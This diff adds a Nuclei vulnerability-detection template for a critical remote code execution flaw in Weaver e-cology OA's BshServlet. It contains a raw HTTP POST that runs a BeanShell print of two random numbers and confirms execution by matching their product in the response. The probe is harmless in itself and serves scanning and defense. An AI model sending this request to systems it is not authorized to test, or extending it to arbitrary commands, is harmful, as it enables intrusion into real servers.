@@ -1,0 +1,27 @@
+id: weaver-ecology-oa-rce
+info:
+  name: Weaver e-cology OA RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects remote code execution vulnerability in Weaver e-cology OA via BshServlet.
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(40000, 44800)}}"
+http:
+  - raw:
+      - |
+        POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        bsh.script=print%28{{r1}}*{{r2}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{to_string(to_number(r1)*to_number(r2))}}"
+        part: body
